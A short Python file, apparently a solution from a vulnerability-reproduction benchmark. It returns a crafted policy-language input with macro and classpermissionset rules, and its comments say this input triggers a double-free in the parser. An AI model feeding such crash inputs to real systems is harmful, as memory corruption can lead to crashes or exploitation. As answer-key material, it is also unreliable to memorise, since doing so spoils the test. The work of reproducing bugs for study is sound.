class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability is a double-free caused by mishandling of an anonymous
        # classpermission passed through a macro to a classpermissionset rule.
        #
        # PoC structure:
        # 1. (class c): Define a class.
        # 2. (permission p): Define a permission.
        # 3. (macro m((classpermission cp))(classpermissionset x(c cp))):
        #    Define a macro 'm' that takes a classpermission 'cp' and uses it
        #    to create a classpermissionset 'x'.
        # 4. (call m((p))): Call the macro with an anonymous classpermission '(p)'.
        #    This creates a temporary object for '(p)' which is then freed twice:
        #    once by the macro context and once by the classpermissionset destructor.
        
        poc = (
            b"(class c)"
            b"(permission p)"
            b"(macro m((classpermission cp))(classpermissionset x(c cp)))"
            b"(call m((p)))"
        )
        return poc
